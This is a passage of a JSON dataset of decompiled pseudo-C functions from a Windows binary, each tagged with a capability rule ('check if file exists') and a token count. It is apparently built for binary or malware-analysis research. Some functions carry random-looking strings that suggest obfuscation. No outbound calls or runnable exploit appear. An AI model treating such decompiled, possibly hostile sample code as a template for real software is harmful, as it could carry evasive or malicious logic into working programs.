puVar2;\n    var_fch = puVar2 + -0x4c;\n    var_f8h = puVar2 + -0x20;\n    *(puVar2 + -0x50) = \"wzesjllijkupazkfggeheaxdeuhmuh\";\n    *(puVar2 + -0x54) = 0x44f932;\n    fcn.00401e79(*(puVar2 + -0x50));\n    var_10h = 2;\n    *(puVar2 + -0x54) = \"ifgozodypgrxbwhkhizychuusearwuukkvuvmrzjadjmbavqpjdledypiladxhpfrykp\";\n    *(puVar2 + -0x58) = 0x44f957;\n    fcn.00401e79(*(puVar2 + -0x54));\n    puVar1 = var_fch;\n    *var_fch = 0xba;\n    puVar1[2] = 0x40f3fa10;\n    puVar1[1] = 0;\n    puVar1[4] = 0x40d048c0;\n    puVar1[3] = 0;\n    puVar1[0x12] = 0x40d9cc00;\n    puVar1[0x11] = 0;\n    var_10h = 0;\n    *(puVar2 + -0x58) = 0x44f9a4;\n    fcn.00402f31(*(puVar2 + -0x54));\n    puVar4 = var_100h;\n    puVar5 = var_100h + -8;\n    *(var_100h + -8) = &fcn.0044f690::var_80h;\n    *(puVar4 + -4) = 0x8ce;\n    *(puVar4 + -0xc) = 0x44f9cd;\n    fcn.00405e1b(*puVar5, *(puVar4 + -4));\n    *(puVar4 + -0xc) = 0x44f9da;\n    fcn.00403b02();\n    *(puVar4 + -0xc) = &fcn.0044f690::var_98h;\n    *(puVar4 + -0x10) = 0x44f9f2;\n    fcn.00401ca3(*(puVar4 + -0xc));\n    *(puVar4 + -0x10) = 0x44fa02;\n    fcn.00403b02();\n    var_104h = puVar4 + -0x44;\n    *(puVar4 + -0x44) = &fcn.0044f690::var_b0h;\n    *(puVar4 + -0x14) = 0x40da2e80;\n    *(puVar4 + -0x18) = 0;\n    *(puVar4 + -0x1c) = 0x40d02f40;\n    *(puVar4 + -0x20) = 0;\n    *(puVar4 + -0x24) = 0x40d1bd00;\n    *(puVar4 + -0x28) = 0;\n    *(puVar4 + -0x10) = 0;\n    *(puVar4 + -0x2c) = 0xf0;\n    *(puVar4 + -0x30) = 0;\n    *(puVar4 + -0x34) = 0;\n    *(puVar4 + -0x38) = 1;\n    *(puVar4 + -0x3c) = 0x1f9c;\n    *(puVar4 + -0x40) = 0x21da;\n    *(puVar4 + -0x48) = 0x44fa7b;\n    fcn.0040662c(*(puVar4 + -0x44), *(puVar4 + -0x40), *(puVar4 + -0x3c), *(puVar4 + -0x38), *(puVar4 + -0x34), \n                 *(puVar4 + -0x30), *(puVar4 + -0x2c), *(puVar4 + -0x28), *(puVar4 + -0x24), *(puVar4 + -0x20), \n                 *(puVar4 + -0x1c), *(puVar4 + -0x18), *(puVar4 + -0x14), *(puVar4 + -0x10));\n    *(puVar4 + -0x48) = 0x44fa8b;\n    fcn.00403b02();\n    var_108h = puVar4 + -0x74;\n    var_114h = puVar4 + -0x74;\n    *(puVar4 + -0x58) = 0x40e21de0;\n    *(puVar4 + -0x5c) = 0;\n    *(puVar4 + -0x60) = 0x40b27900;\n    *(puVar4 + -100) = 0;\n    *(puVar4 + -0x70) = 0x408b1000;\n    *(puVar4 + -0x74) = 0;\n    *(puVar4 + -0x48) = 0;\n    *(puVar4 + -0x4c) = 1;\n    *(puVar4 + -0x50) = 0;\n    *(puVar4 + -0x54) = 0x5ea;\n    *(puVar4 + -0x68) = 0;\n    *(puVar4 + -0x6c) = 1;\n    *(puVar4 + -0x78) = 0x44faf4;\n    fcn.004016b3(*(puVar4 + -0x74), *(puVar4 + -0x70), *(puVar4 + -0x6c), *(puVar4 + -0x68), *(puVar4 + -100), \n                 *(puVar4 + -0x60), *(puVar4 + -0x5c), *(puVar4 + -0x58), *(puVar4 + -0x54), *(puVar4 + -0x50), \n                 *(puVar4 + -0x4c), *(puVar4 + -0x48));\n    *(puVar4 + -0x78) = puVar4 + -0x74;\n    var_110h = puVar4 + -0xbc;\n    var_10ch = puVar4 + -0x94;\n    *(puVar4 + -0xc0) =\n         \"dznsfbvmmmisgjdlbmcyifgstijqbwpupzdbncybuplzwnpglzncswgajtqnivlpzehoxybdbsremhnoehojakiahtnalilpvh\";\n    *(puVar4 + -0xc4) = 0x44fb28;\n    fcn.00401e79(*(puVar4 + -0xc0));\n    var_10h = 1;\n    *(puVar4 + -0xc4) = \"jwnmqrehfpkifxbqstdhnvnanqlslkziclgztbqcclzejfglnygcgebemtqaensbvql\";\n    *(puVar4 + -200) = 0x44fb4a;\n    fcn.00401e79(*(puVar4 + -0xc4));\n    puVar2 = var_110h;\n    var_110h[0x18] = 0;\n    *(puVar2 + 0x20) = 0x40dabf00;\n    *(puVar2 + 0x1c) = 0;\n    *(puVar2 + 0x24) = 0x150;\n    *(puVar2 + 0x44) = 0x40c45180;\n    *(puVar2 + 0x40) = 0;\n    var_10h = 0;\n    *(puVar4 + -200) = 0x44fb8e;\n    fcn.00401d75(*(puVar4 + -0xc4));\n    puVar2 = var_114h;\n    var_11ch = var_114h;\n    *(var_114h + -4) = var_114h;\n    var_118h = puVar2 + -0x20;\n    *(puVar2 + -0x24) = \"vjpwpzlcewhlhqwrv\";\n    *(puVar2 + -0x28) = 0x44fbc4;\n    fcn.00401e79(*(puVar2 + -0x24));\n    piVar3 = var_118h;\n    *var_118h = &fcn.0044f690::var_c8h;\n    piVar3[7] = 0xad2;\n    *(puVar2 + -0x28) = 0x44fbe9;\n    fcn.00402428(*(puVar2 + -0x24));\n    puVar2 = var_11ch;\n    *(var_11ch + -4) = 0x44fc01;\n    fcn.00403b02();\n    var_124h = puVar2 + -0x18;\n    *(puVar2 + -4) = 0x41b;\n    *(puVar2 + -8) = 0xc5a;\n    *(puVar2 + -0xc) = 0x21e7;\n    *(puVar2 + -0x10) = 0x10ce;\n    *(puVar2 + -0x14) = 0x13fd;\n    *(puVar2 + -0x18) = 0x1276;\n    *(puVar2 + -0x1c) = 0x44fc3a;\n    fcn.004059c0(*(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), \n                 *(puVar2 + -4));\n    *(puVar2 + -0x1c) = 0x44fc4c;\n    fcn.00402bb2();\n    *(puVar2 + -0x1c) = 0x44fc5c;\n    fcn.00405600();\n    var_120h = puVar2 + -0x58;\n    *(puVar2 + -0x5c) = \"yaxdwrvccjcdfsuorpujybtqexxijroskhegpaofd\";\n    *(puVar2 + -0x60) = 0x44fc89;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    puVar1 = var_120h;\n    *var_120h = 0x5ac;\n    puVar1[2] = 0x40b99000;\n    puVar1[1] = 0;\n    *(puVar1 + 3) = 0;\n    puVar1[10] = 0x1002;\n    *(puVar1 + 0xb) = 0;\n    *(puVar1 + 0xc) = 1;\n    puVar1[0xe] = 0x40b6c200;\n    puVar1[0xd] = 0;\n    *(puVar1 + 0xf) = 0;\n    *(puVar2 + -0x60) = 0x44fcd8;\n    fcn.00404219(*(puVar2 + -0x5c));\n    *in_FS_OFFSET = var_18h;\n    return var_d0h;\n}\n",
        "token_count": 4210
    },
    "0040119a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040119a(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403d64(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 348
    },
    "004013e3": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.004013e3(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.00404d63(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.004051cd();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[10];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x55692c;\n                    param_1[0xd] = 0x55692c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 366
    },
    "00401875": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401875(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.0040523b(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 347
    },
    "004019e7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004019e7(int32_t *param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if (*param_1 != 0) {\n        in_EAX = fcn.00401f2d();\n        if (in_EAX != 0xffffffff) {\n            *(param_1 + 5) = in_EAX;\n            goto code_r0x004686a2;\n        }\n    }\n    *param_1 = 0;\n    in_EAX = in_EAX & 0xffffff00 | *(param_1 + 5);\ncode_r0x004686a2:\n    *(param_1 + 1) = 1;\n    return in_EAX;\n}\n",
        "token_count": 157
    },
    "00401c7b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401c7b(int32_t *param_1)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    \n    if (*param_1 != 0) {\n        iVar2 = fcn.0040164f();\n        if (iVar2 != -1) {\n            uVar1 = 0;\n            goto code_r0x004680e9;\n        }\n    }\n    *param_1 = 0;\n    uVar1 = 1;\ncode_r0x004680e9:\n    *(param_1 + 1) = uVar1;\n    return;\n}\n",
        "token_count": 135
    },
    "00401f32": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401f32(uint *arg_8h, uint32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    \n    if (arg_ch < 10) {\n        if ((*in_ECX != -1) && (arg_ch <= *in_ECX)) {\n            puVar1 = in_ECX[arg_ch + 1];\n            *arg_8h = *puVar1;\n            arg_8h[1] = puVar1[1];\n            return;\n        }\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 3;\n    }\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 192
    },
    "00402117": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00402117(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    cVar1 = fcn.00404688(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00406622();\n        if (cVar1 != '\\0') {\n            arg_ch = param_1[10];\n            if (arg_ch == -1) {\n                arg_ch = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == NULL) {\n                    arg_8h = \"(null)\";\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = 0x55692c;\n                    param_1[0xd] = 0x55692c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 364
    },
    "0040213a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040213a(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 334
    },
    "004021d5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.004021d5(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    if (*0x571cd0 == -1) {\n        return 0;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    uVar2 = fcn.00404197(*0x571cd0);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n    return -(uVar2 != 0xffffffff) & uVar2;\n}\n",
        "token_count": 116
    },
    "00402293": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402293(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.0040494e(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 347
    },
    "00402513": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402513(int32_t noname_0, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar auStack20 [4];\n    uint var_ch;\n    uint uStack12;\n    \n    do {\n        uStack12 = 0x461470;\n        iVar2 = fcn.00401596();\n        if (iVar2 != 0) {\n            return;\n        }\n        uStack12 = 0x461463;\n        iVar2 = fcn.0040417e(noname_0);\n    } while (iVar2 != 0);\n    if (noname_0 != -1) {\n        fcn.0040452a();\n        fcn.004067ee(&stack0xffffffec, 0x56bb00);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00401a91();\n    fcn.004067ee(&stack0xffffffec, 0x566ab4);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 247
    },
    "004027de": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004027de(void)\n\n{\n    if (*0x571cd0 != -1) {\n        fcn.00402c66(*0x571cd0);\n        *0x571cd0 = -1;\n    }\n    return 1;\n}\n",
        "token_count": 58
    },
    "00402a04": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402a04(char *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint uVar6;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004dcddf:\n            if (arg_ch != 0) {\n                if (arg_14h == 0) {\n                    *arg_8h = '\\0';\n                    return 0;\n                }\n                if (arg_10h != 0) {\n                    iVar3 = arg_14h;\n                    pcVar4 = arg_8h;\n                    iVar5 = arg_ch;\n                    if (arg_14h == -1) {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if (cVar1 == '\\0') break;\n                            iVar5 = iVar5 + -1;\n                        } while (iVar5 != 0);\n                    }\n                    else {\n                        do {\n                            cVar1 = pcVar4[arg_10h - arg_8h];\n                            *pcVar4 = cVar1;\n                            pcVar4 = pcVar4 + 1;\n                            if ((cVar1 == '\\0') || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != 0);\n                        if (iVar3 == 0) {\n                            *pcVar4 = '\\0';\n                        }\n                    }\n                    if (iVar5 != 0) {\n                        return 0;\n                    }\n                    if (arg_14h == -1) {\n                        arg_8h[arg_ch + -1] = '\\0';\n                        return 0x50;\n                    }\n                    *arg_8h = '\\0';\n                    puVar2 = fcn.00403a35();\n                    uVar6 = 0x22;\n                    goto code_r0x004dcdcd;\n                }\n                *arg_8h = '\\0';\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004dcddf;\n    puVar2 = fcn.00403a35();\n    uVar6 = 0x16;\ncode_r0x004dcdcd:\n    *puVar2 = uVar6;\n    fcn.004037ce();\n    return uVar6;\n}\n",
        "token_count": 612
    },
    "00402d92": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402d92(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_8h = param_1[10];\n    arg_8h_00 = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h_00;\n    if (arg_8h == -1) {\n        arg_8h = 0x7fffffff;\n    }\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h_00 == 0) {\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.004065be(arg_8h);\n    }\n    else {\n        if (arg_8h_00 == 0) {\n            arg_8h_00 = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h_00, arg_8h);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 347
    },
    "00402f18": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00402f18(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    cVar1 = fcn.00402ecd(param_1 + 0xd);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404331();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = param_1[10];\n            if (arg_8h_00 == -1) {\n                arg_8h_00 = 0x7fffffff;\n            }\n            arg_8h = param_1[0xd];\n            cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            if (cVar1 == '\\0') {\n                if (arg_8h == 0) {\n                    param_1[0xd] = \"(null)\";\n                }\n                uVar2 = fcn.00403869(arg_8h_00);\n            }\n            else {\n                if (arg_8h == 0) {\n                    arg_8h = 0x55692c;\n                    param_1[0xd] = 0x55692c;\n                }\n                *(param_1 + 0xf) = 1;\n                uVar2 = fcn.00403eb8(arg_8h, arg_8h_00);\n            }\n            param_1[0xe] = uVar2;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 376
    },
    "00402f59": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402f59(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00404b1a(arg_8h, arg_ch);\n    return uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n}\n",
        "token_count": 74
    },
    "0040347c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040347c(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(8);\n    fcn.0040620d(0);\n    piVar1 = *0x574348;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.004052f4();\n    iVar3 = fcn.00402171(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00402e46(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.004058b7();\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.004023e2(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x578000)();\n        (*pcVar2)();\n        *0x574348 = piVar1;\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 416
    },
    "0040367f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040367f(uint *param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t arg_ch;\n    char *arg_8h;\n    \n    param_1[5] = param_1[5] + 4;\n    arg_ch = param_1[10];\n    arg_8h = *(param_1[5] + -4);\n    param_1[0xd] = arg_8h;\n    if (arg_ch == -1) {\n        arg_ch = 0x7fffffff;\n    }\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        if (arg_8h == NULL) {\n            arg_8h = \"(null)\";\n            param_1[0xd] = \"(null)\";\n        }\n        uVar2 = fcn.00403fd0(arg_8h, arg_ch);\n    }\n    else {\n        if (arg_8h == NULL) {\n            arg_8h = 0x55692c;\n            param_1[0xd] = 0x55692c;\n        }\n        *(param_1 + 0xf) = 1;\n        uVar2 = fcn.00403eb8(arg_8h, arg_ch);\n    }\n    param_1[0xe] = uVar2;\n    return 1;\n}\n",
        "token_count": 334
    },
    "00403bac": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403bac(uint *arg_8h, uint arg_ch, int32_t arg_10h, uint noname_3, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar1 = *(arg_18h + 0xc);\n    uVar4 = uVar1;\n    uVar5 = uVar1;\n    if (-1 < arg_1ch) {\n        piVar3 = uVar1 * 0x14 + *(arg_18h + 0x10) + 8;\n        var_4h = uVar1;\n        do {\n            if (uVar4 == 0xffffffff) goto code_r0x00488e2f;\n            uVar4 = uVar4 - 1;\n            if (((piVar3[-6] < arg_10h) && (arg_10h <= piVar3[-5])) || (uVar4 == 0xffffffff)) {\n                arg_1ch = arg_1ch + -1;\n                uVar5 = var_4h;\n                var_4h = uVar4;\n            }\n            piVar3 = piVar3 + -5;\n        } while (-1 < arg_1ch);\n    }\n    if ((uVar5 <= uVar1) && (uVar4 + 1 <= uVar5)) {\n        arg_8h[3] = uVar5;\n        *arg_8h = arg_ch;\n        arg_8h[1] = uVar4 + 1;\n        arg_8h[2] = arg_ch;\n        return;\n    }\ncode_r0x00488e2f:\n    fcn.00404f39();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 442
    },
    "00403bd4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00403bd4(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = arg_10h;\n    uVar5 = arg_ch;\n    if ((-1 < arg_10h) && ((0 < arg_10h || (arg_ch != 0)))) {\n        do {\n            if (*in_ECX[8] == 0) {\n                uVar4 = 0;\n            }\n            else {\n                uVar4 = *in_ECX[0xc];\n            }\n            var_8h = uVar4 >> 0x1f;\n            if ((var_8h < 0) || ((-1 < uVar4 || var_8h < 0 && (uVar4 == 0)))) {\n                pcVar1 = *(*in_ECX + 0xc);\n                (**0x578000)(*arg_8h);\n                iVar2 = (*pcVar1)();\n                if (iVar2 == -1) break;\n                bVar6 = uVar5 != 0;\n                uVar5 = uVar5 - 1;\n                iVar3 = iVar3 + -1 + bVar6;\n                uVar4 = 1;\n            }\n            else {\n                if ((iVar3 <= var_8h) && ((iVar3 < var_8h || (uVar5 < uVar4)))) {\n                    uVar4 = uVar5;\n                    var_8h = iVar3;\n                }\n                fcn.00405830(*in_ECX[8], arg_8h, uVar4);\n                bVar6 = uVar5 < uVar4;\n                uVar5 = uVar5 - uVar4;\n                iVar3 = (iVar3 - var_8h) - bVar6;\n                *in_ECX[0xc] = *in_ECX[0xc] - uVar4;\n                *in_ECX[8] = *in_ECX[8] + uVar4;\n            }\n            arg_8h = arg_8h + uVar4;\n            if ((iVar3 < 1) && ((iVar3 < 0 || (uVar5 == 0)))) break;\n        } while( true );\n    }\n    return CONCAT44((arg_10h - iVar3) - (arg_ch < uVar5), arg_ch - uVar5);\n}\n",
        "token_count": 606
    },
    "00403c83": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
